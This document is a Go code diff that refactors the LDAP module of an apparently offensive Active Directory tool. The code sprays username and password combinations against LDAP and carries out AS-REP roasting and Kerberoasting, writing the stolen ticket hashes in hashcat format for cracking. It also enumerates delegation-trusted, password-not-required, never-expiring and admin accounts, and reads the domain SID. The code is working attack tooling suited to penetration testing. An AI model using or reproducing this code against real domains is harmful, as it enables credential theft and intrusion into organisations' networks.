@@ -6,7 +6,6 @@ import (
 
 	"github.com/5amu/goad/pkg/kerberos"
 	"github.com/5amu/goad/pkg/ldap"
-	"github.com/5amu/goad/pkg/utils"
 )
 
 type LdapOptions struct {
@@ -51,28 +50,19 @@ type LdapOptions struct {
 		Collection           []string `short:"c" long:"collection" default:"Default" description:"Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All"`
 	} `group:"Run Bloodhound Collector v4.2" description:"Run Bloodhound Collector v4.2"`
 
-	targets   []string
-	usernames []string
-	passwords []string
+	targets     []string
+	filter      string
+	credentials []credential
 }
 
 func (o *LdapOptions) Run() (err error) {
+	o.credentials = NewCredentialsClusterBomb(
+		sliceFromString(o.Connection.Username),
+		sliceFromString(o.Connection.Password),
+	)
 
-	o.usernames, err = utils.ReadLines(o.Connection.Username)
-	if err != nil {
-		o.usernames = []string{o.Connection.Username}
-	}
-	o.passwords, err = utils.ReadLines(o.Connection.Password)
-	if err != nil {
-		o.passwords = []string{o.Connection.Password}
-	}
 	for _, t := range o.Targets.TARGETS {
-		lines, err := utils.ReadLines(t)
-		if err != nil {
-			o.targets = append(o.targets, t)
-		} else {
-			o.targets = append(o.targets, lines...)
-		}
+		o.targets = append(o.targets, sliceFromString(t)...)
 	}
 
 	var f func(string) error
@@ -81,20 +71,26 @@ func (o *LdapOptions) Run() (err error) {
 		f = o.asreproast
 	} else if o.Hashes.Kerberoast != "" {
 		f = o.kerberoast
-	} else if o.Enum.TrustedForDelegation {
-		f = o.trustedForDelegation
-	} else if o.Enum.PasswordNotRequired {
-		f = o.passwordNotRequired
-	} else if o.Enum.UsersEnum {
-		f = o.userenum
-	} else if o.Enum.GroupsEnum {
-		f = o.groupenum
-	} else if o.Enum.PasswordNeverExpires {
-		f = o.passwordNeverExpires
 	} else if o.Enum.GetSID {
 		f = o.domainSID
+	} else if o.Enum.TrustedForDelegation {
+		o.filter = ldap.JoinFilters(ldap.FilterIsUser, ldap.NegativeFilter(ldap.FilterDisabledUser), ldap.FilterTrustedForDelegation)
+		f = o.enumeration
+	} else if o.Enum.PasswordNotRequired {
+		o.filter = ldap.JoinFilters(ldap.FilterIsUser, ldap.NegativeFilter(ldap.FilterDisabledUser), ldap.FilterPasswordNotRequired)
+		f = o.enumeration
+	} else if o.Enum.UsersEnum {
+		o.filter = ldap.FilterIsUser
+		f = o.enumeration
+	} else if o.Enum.GroupsEnum {
+		o.filter = ldap.FilterIsGroup
+		f = o.enumeration
+	} else if o.Enum.PasswordNeverExpires {
+		o.filter = ldap.JoinFilters(ldap.FilterIsUser, ldap.NegativeFilter(ldap.FilterDisabledUser), ldap.FilterDontExpirePassword)
+		f = o.enumeration
 	} else if o.Enum.AdminCount {
-		f = o.adminCount
+		o.filter = ldap.JoinFilters(ldap.FilterIsUser, ldap.NegativeFilter(ldap.FilterDisabledUser), ldap.FilterIsAdmin)
+		f = o.enumeration
 	} else {
 		return fmt.Errorf("nothing to do")
 	}
@@ -113,17 +109,28 @@ func (o *LdapOptions) Run() (err error) {
 	return nil
 }
 
+func (o *LdapOptions) authenticateLdap(ldapClient *ldap.LdapClient) (credential, error) {
+	for _, creds := range o.credentials {
+		if err := ldapClient.Authenticate(creds.Username, creds.Password); err != nil {
+			fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, creds.Username, creds.Password, err)
+		} else {
+			return creds, nil
+		}
+	}
+	return credential{}, fmt.Errorf("no valid authentication")
+}
+
 func (o *LdapOptions) asreproast(target string) error {
 	var res []string
-	for _, user := range o.usernames {
+	for _, creds := range o.credentials {
 		client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
 		if err != nil {
 			return err
 		}
-		asrep, err := client.GetAsReqTgt(user)
+		asrep, err := client.GetAsReqTgt(creds.Username)
 		if err == nil {
-			hash := utils.ASREPToHashcat(*asrep.Ticket)
-			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.Connection.Domain, user, hash)
+			hash := kerberos.ASREPToHashcat(*asrep.Ticket)
+			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.Connection.Domain, creds.Username, hash)
 			res = append(res, hash)
 		}
 	}
@@ -131,249 +138,86 @@ func (o *LdapOptions) asreproast(target string) error {
 	if len(res) == 0 {
 		return fmt.Errorf("[%s] no asrep-roastable user found on target", target)
 	}
-	return utils.WriteLines(res, o.Hashes.AsrepRoast)
+	return writeLines(res, o.Hashes.AsrepRoast)
 }
 
 func (o *LdapOptions) kerberoast(target string) error {
-	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
+	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
 	ldapFilter := ldap.JoinFilters(
 		ldap.FilterIsUser,
 		ldap.NegativeFilter(ldap.FilterDisabledUser),
 		ldap.NewFilter(ldap.AttributeServicePrincipalName, "*"),
 	)
+	defer lclient.Close()
 
 	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
 	if err != nil {
 		return err
 	}
 
-	for _, user := range o.usernames {
-		for _, password := range o.passwords {
-			if err := ldapClient.Authenticate(user, password); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
-				continue
-			}
-			defer ldapClient.Close()
-
-			krb5client.AuthenticateWithPassword(user, password)
-			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
-				var res []string
-				for _, entry := range users {
-					usr := entry[ldap.AttributeSAMAccountName]
-					spn := entry[ldap.AttributeServicePrincipalName]
-					tgs, err := krb5client.GetServiceTicket(usr, spn)
-					if err != nil {
-						return err
-					}
-					hash := utils.TGSToHashcat(tgs.Ticket, usr)
-					res = append(res, hash)
-					fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.Connection.Domain, usr, spn, hash)
-				}
-				if len(res) == 0 {
-					return fmt.Errorf("[%s] no kerberoastable user found on target", target)
-				}
-				return utils.WriteLines(res, o.Hashes.Kerberoast)
-			}, ldap.AttributeSAMAccountName, ldap.AttributeServicePrincipalName)
-		}
+	creds, err := o.authenticateLdap(lclient)
+	if err != nil {
+		return err
 	}
-	return nil
-}
+	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
 
-func (o *LdapOptions) trustedForDelegation(target string) error {
-	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
-	ldapFilter := ldap.JoinFilters(
-		ldap.FilterIsUser,
-		ldap.NegativeFilter(ldap.FilterDisabledUser),
-		ldap.FilterTrustedForDelegation,
-	)
-
-	for _, user := range o.usernames {
-		for _, password := range o.passwords {
-			if err := ldapClient.Authenticate(user, password); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
-				continue
-			}
-			defer ldapClient.Close()
-
-			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
-				if len(users) == 0 {
-					return fmt.Errorf("[%s]-[%s\\%s:%s] no user with TRUSTED_FOR_DELEGATION", target, o.Connection.Domain, user, password)
-				}
-
-				for _, entry := range users {
-					usr := entry[ldap.AttributeSAMAccountName]
-					fmt.Printf("[%s]-[%s\\%s:%s] the user is trusted for delegation %s\\%s\n", target, o.Connection.Domain, user, password, o.Connection.Domain, usr)
-				}
-				return nil
-			}, ldap.AttributeSAMAccountName)
-		}
-	}
-	return nil
-}
-
-func (o *LdapOptions) passwordNotRequired(target string) error {
-	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
-	ldapFilter := ldap.JoinFilters(
-		ldap.FilterIsUser,
-		ldap.NegativeFilter(ldap.FilterDisabledUser),
-		ldap.FilterPasswordNotRequired,
-	)
-
-	for _, user := range o.usernames {
-		for _, password := range o.passwords {
-			if err := ldapClient.Authenticate(user, password); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
-				continue
-			}
-			defer ldapClient.Close()
-
-			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
-				if len(users) == 0 {
-					return fmt.Errorf("no user with PASSWD_NOTREQD")
-				}
-				for _, entry := range users {
-					usr := entry[ldap.AttributeSAMAccountName]
-					fmt.Printf("[%s]-[%s\\%s:%s] password not required for %s\\%s\n", target, o.Connection.Domain, user, password, o.Connection.Domain, usr)
-				}
-				return nil
-			}, ldap.AttributeSAMAccountName)
-		}
-	}
-	return nil
-}
-
-func (o *LdapOptions) passwordNeverExpires(target string) error {
-	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
-	ldapFilter := ldap.JoinFilters(
-		ldap.FilterIsUser,
-		ldap.NegativeFilter(ldap.FilterDisabledUser),
-		ldap.FilterDontExpirePassword,
-	)
-
-	for _, user := range o.usernames {
-		for _, password := range o.passwords {
-			if err := ldapClient.Authenticate(user, password); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
-				continue
-			}
-			defer ldapClient.Close()
-
-			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
-				if len(users) == 0 {
-					return fmt.Errorf("impossible to enumerate users with a never expiring password")
-				}
-				for _, entry := range users {
-					usr := entry[ldap.AttributeSAMAccountName]
-					fmt.Printf("[%s]-[%s\\%s\\%s] %s\\%s has a never expiring password\n", o.Connection.Domain, target, user, password, o.Connection.Domain, usr)
-				}
-				return nil
-			}, ldap.AttributeSAMAccountName)
-		}
-	}
-	return nil
-}
-
-func (o *LdapOptions) adminCount(target string) error {
-	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
-	ldapFilter := ldap.JoinFilters(
-		ldap.FilterIsUser,
-		ldap.NegativeFilter(ldap.FilterDisabledUser),
-		ldap.FilterIsAdmin,
-	)
-
-	for _, user := range o.usernames {
-		for _, password := range o.passwords {
-			if err := ldapClient.Authenticate(user, password); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
-				continue
-			}
-			defer ldapClient.Close()
-
-			return ldapClient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
-				if len(users) == 0 {
-					return fmt.Errorf("no user with (adminCount=1)")
-				}
-				for _, entry := range users {
-					usr := entry[ldap.AttributeSAMAccountName]
-					fmt.Printf("[%s]-[%s\\%s\\%s] %s\\%s has (adminCount=1)\n", o.Connection.Domain, target, user, password, o.Connection.Domain, usr)
-				}
-				return nil
-			}, ldap.AttributeSAMAccountName)
-		}
-	}
-	return nil
-}
-
-func (o *LdapOptions) userenum(target string) error {
-	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
-
-	for _, user := range o.usernames {
-		for _, password := range o.passwords {
-			if err := ldapClient.Authenticate(user, password); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
-				continue
-			}
-			defer ldapClient.Close()
-
-			return ldapClient.FindObjectsWithCallback(ldap.FilterIsUser, func(users []map[string]string) error {
-				if len(users) == 0 {
-					return fmt.Errorf("impossible to enumerate users")
-				}
-				for _, entry := range users {
-					usr := entry[ldap.AttributeSAMAccountName]
-					fmt.Printf("[%s]-[%s\\%s:%s] found user %s\\%s\n", target, o.Connection.Domain, user, password, o.Connection.Domain, usr)
-				}
-				return nil
-			}, ldap.AttributeSAMAccountName)
-		}
-	}
-	return nil
-}
-
-func (o *LdapOptions) groupenum(target string) error {
-	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
-
-	for _, user := range o.usernames {
-		for _, password := range o.passwords {
-			if err := ldapClient.Authenticate(user, password); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
-				continue
-			}
-			defer ldapClient.Close()
-
-			return ldapClient.FindObjectsWithCallback(ldap.FilterIsGroup, func(users []map[string]string) error {
-				if len(users) == 0 {
-					return fmt.Errorf("impossible to enumerate groups")
-				}
-				for _, entry := range users {
-					grp := entry[ldap.AttributeSAMAccountName]
-					fmt.Printf("[%s]-[%s\\%s:%s] found group %s\\%s\n", target, o.Connection.Domain, user, password, o.Connection.Domain, grp)
-				}
-				return nil
-			}, ldap.AttributeSAMAccountName)
-		}
-	}
-	return nil
-}
-
-func (o *LdapOptions) domainSID(target string) error {
-	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
-
-	for _, user := range o.usernames {
-		for _, password := range o.passwords {
-			if err := ldapClient.Authenticate(user, password); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
-				continue
-			}
-			defer ldapClient.Close()
-
-			sid, err := ldapClient.GetDomainSID()
+	return lclient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
+		var res []string
+		for _, entry := range users {
+			usr := entry[ldap.AttributeSAMAccountName]
+			spn := entry[ldap.AttributeServicePrincipalName]
+			tgs, err := krb5client.GetServiceTicket(usr, spn)
 			if err != nil {
 				return err
 			}
-			fmt.Printf("[%s]-[%s\\%s:%s] domain SID is %v\n", target, o.Connection.Domain, user, password, sid)
-			return nil
+			hash := kerberos.TGSToHashcat(tgs.Ticket, usr)
+			res = append(res, hash)
+			fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.Connection.Domain, usr, spn, hash)
 		}
+		if len(res) == 0 {
+			return fmt.Errorf("[%s] no kerberoastable user found on target", target)
+		}
+		return writeLines(res, o.Hashes.Kerberoast)
+	}, ldap.AttributeSAMAccountName, ldap.AttributeServicePrincipalName)
+}
+
+func (o *LdapOptions) enumeration(target string) error {
+	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
+	defer lclient.Close()
+
+	creds, err := o.authenticateLdap(lclient)
+	if err != nil {
+		return err
 	}
+	return lclient.FindObjectsWithCallback(o.filter, func(m []map[string]string) error {
+		if len(m) == 0 {
+			return fmt.Errorf("[%s]-[%s\\%s:%s] no result found",
+				target, o.Connection.Domain, creds.Username, creds.Password,
+			)
+		}
+		for _, entry := range m {
+			fmt.Printf("[%s]-[%s\\%s:%s]  %s\\%s\n",
+				target, o.Connection.Domain, creds.Username, creds.Password,
+				o.Connection.Domain, entry[ldap.AttributeSAMAccountName],
+			)
+		}
+		return nil
+	}, ldap.AttributeSAMAccountName)
+}
+
+func (o *LdapOptions) domainSID(target string) error {
+	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
+	defer lclient.Close()
+
+	creds, err := o.authenticateLdap(lclient)
+	if err != nil {
+		return err
+	}
+
+	sid, err := lclient.GetDomainSID()
+	if err != nil {
+		return err
+	}
+	fmt.Printf("[%s]-[%s\\%s:%s] %v\n", target, o.Connection.Domain, creds.Username, creds.Password, sid)
 	return nil
 }
